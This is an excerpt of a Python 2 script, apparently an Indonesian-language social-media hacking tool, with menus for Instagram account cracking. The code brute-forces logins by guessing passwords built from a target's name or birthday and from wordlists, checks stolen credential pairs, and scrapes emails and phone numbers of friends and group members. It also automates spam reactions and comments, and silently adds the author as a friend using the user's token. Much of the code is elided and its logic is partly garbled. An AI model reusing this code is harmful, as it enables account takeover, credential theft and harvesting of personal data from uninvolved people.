...
def login():
    ...
    try:
        ...
        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN instagram AKUN FB \x1b[1;91m[\xe2\x98\x86]'
        ...
        if 'save-device' in url:
            try:
                ...
                requests.post('https://graph.instagram.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
...
def menu():
    ...
    print '\x1b[1;37;40m2. Hack Akun instagram'
...
def informasi():
    ...
    r = requests.get('https://graph.instagram.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for p in cok['data']:
        if id in p['name'] or id in p['id']:
            r = requests.get('https://graph.instagram.com/' + p['id'] + '?access_token=' + toket)
            z = json.loads(r.text)
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            try:
...
def menu_hack():
    ...
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Mini Hack instagram(\x1b[1;92mTarget\x1b[1;97m)'
    print '\x1b[1;37;40m2. Multi Bruteforce instagram'
    print '\x1b[1;37;40m3. Super Multi Bruteforce instagram'
...
def mini():
    ...
    try:
        ...
        try:
            ...
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
            r = requests.get('https://graph.instagram.com/' + id + '?access_token=' + toket)
            a = json.loads(r.text)
            ...
            data = urllib.urlopen('https://b-api.instagram.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            y = json.load(data)
            if 'access_token' in y:
                ...
                if 'www.instagram.com' in y['error_msg']:
                    print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                    ...
                    data = urllib.urlopen('https://b-api.instagram.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    y = json.load(data)
                    if 'access_token' in y:
                        print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                        ...
                        if 'www.instagram.com' in y['error_msg']:
                            ...
                            pz3 = a['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.instagram.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            y = json.load(data)
                            if 'access_token' in y:
                                print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                                ...
                                if 'www.instagram.com' in y['error_msg']:
                                    ...
                                    lahir = a['birthday']
                                    pz4 = lahir.replace('/', '')
                                    data = urllib.urlopen('https://b-api.instagram.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    y = json.load(data)
                                    if 'access_token' in y:
                                        print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
...
def scrak():
    ...
    try:
        ...
        while file:
            ...
            url = 'https://b-api.instagram.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            ...
            if 'access_token' in mpsh:
                ...
                if 'www.instagram.com' in mpsh['error_msg']:
    ...
    if peak == '':
        ...
        if peak == '1':
            ...
            if peak == '2':
                ...
                try:
                    r = requests.get('https://graph.instagram.com/group/?id=' + idg + '&access_token=' + toket)
                ...
                re = requests.get('https://graph.instagram.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
        ...
        try:
            ...
            for pw in sandi:
                try:
                    ...
                    sys.stdout.flush()
                    data = requests.get('https://b-api.instagram.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
...
def menu_yahoo():
    ...
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Dari teman instagram'
...
def yahoofriends():
    ...
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
    teman = requests.get('https://graph.instagram.com/me/friends?access_token=' + toket)
    ...
    for w in kimak['data']:
        ...
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.instagram.com/' + id + '?access_token=' + toket)
...
def idfrom_teman():
    ...
    try:
        ...
        try:
            ...
            r = requests.get('https://graph.instagram.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
            z = json.loads(r.text)
...
def id_member_grup():
    ...
    try:
        ...
        try:
            ...
            try:
                r = requests.get('https://graph.instagram.com/group/?id=' + id + '&access_token=' + toket)
                asw = json.loads(r.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
            except KeyError:
                print '\x1b[1;91m[!] Grup tidak ditemukan'
            ...
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            re = requests.get('https://graph.instagram.com/' + id + '/members?fields=name,id&access_token=' + toket)
            s = json.loads(re.text)
            for i in s['data']:
                idmem.append(i['id'])
                b.write(i['id'] + '\n')
...
def email():
    ...
    try:
        ...
        try:
            ...
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.instagram.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    em.append(z['email'])
                    mpsh.write(z['email'] + '\n')
...
def emailfrom_teman():
    ...
    try:
        ...
        try:
            ...
            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.instagram.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
...
def nomor_hp():
    ...
    try:
        ...
        try:
            ...
            url = 'https://graph.instagram.com/me/friends?access_token=' + toket
            r = requests.get(url)
            z = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for n in z['data']:
                x = requests.get('https://graph.instagram.com/' + n['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
...
def react():
    ...
    try:
        ...
        try:
            oh = requests.get('https://graph.instagram.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ...
            for a in ah['feed']['data']:
                y = a['id']
                reaksi.append(y)
                requests.post('https://graph.instagram.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
...
def reactg():
    ...
    try:
        ...
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
        ah = requests.get('https://graph.instagram.com/group/?id=' + ide + '&access_token=' + toket)
        asw = json.loads(ah.text)
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
        try:
            oh = requests.get('https://graph.instagram.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ah = json.loads(oh.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for a in ah['feed']['data']:
...
def bot_komen():
    ...
    try:
        ...
        km = km.replace('<>', '\n')
        try:
            p = requests.get('https://graph.instagram.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for s in a['feed']['data']:
                f = s['id']
                komen.append(f)
                requests.post('https://graph.instagram.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
...
def grup_komen():
    ...
    try:
        ...
        try:
            ...
            asw = json.loads(ah.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
            p = requests.get('https://graph.instagram.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for s in a['feed']['data']:
...
def deletepost():
    ...
    try:
        toket = open('login.txt', 'r').read()
        nam = requests.get('https://graph.instagram.com/me?access_token=' + toket)
    ...
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    asu = requests.get('https://graph.instagram.com/me/feed?access_token=' + toket)
    asus = json.loads(asu.text)
    for p in asus['data']:
        id = p['id']
        piro = 0
        url = requests.get('https://graph.instagram.com/' + id + '?method=delete&access_token=' + toket)
...
def accept():
    ...
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
    r = requests.get('https://graph.instagram.com/me/friendrequests?limit=' + limit + '&access_token=' + toket)
    ...
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    for i in teman['data']:
        gas = requests.post('https://graph.instagram.com/me/friends/' + i['from']['id'] + '?access_token=' + toket)
...
def unfriend():
    ...
    try:
        ...
        print
        try:
            pek = requests.get('https://graph.instagram.com/me/friends?access_token=' + toket)
            cok = json.loads(pek.text)
            for i in cok['data']:
                nama = i['name']
                id = i['id']
                requests.delete('https://graph.instagram.com/me/friends?uid=' + id + '&access_token=' + toket)
...
def status():
    ...
    if msg == '':
        ...
        res = requests.get('https://graph.instagram.com/me/feed?method=POST&message=' + msg + '&access_token=' + toket)
...
def check_akun():
    ...
    for meki in list:
        ...
        url = 'https://b-api.instagram.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        data = requests.get(url)
        mpsh = json.loads(data.text)
        if 'access_token' in mpsh:
            live.append(password)
            print '\x1b[1;97m[\x1b[1;92mLive\x1b[1;97m]  \x1b[1;97m' + username + ' | ' + password
        elif 'www.instagram.com' in mpsh['error_msg']:
            cek.append(password)
...
def grupsaya():
    ...
    try:
        ...
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        try:
            uh = requests.get('https://graph.instagram.com/me/groups?access_token=' + toket)
...
def get_userid(toket):
    url = 'https://graph.instagram.com/me?access_token=%s' % toket
...
def gaz(toket, enable=True):
    ...
    url = 'https://graph.instagram.com/graphql'
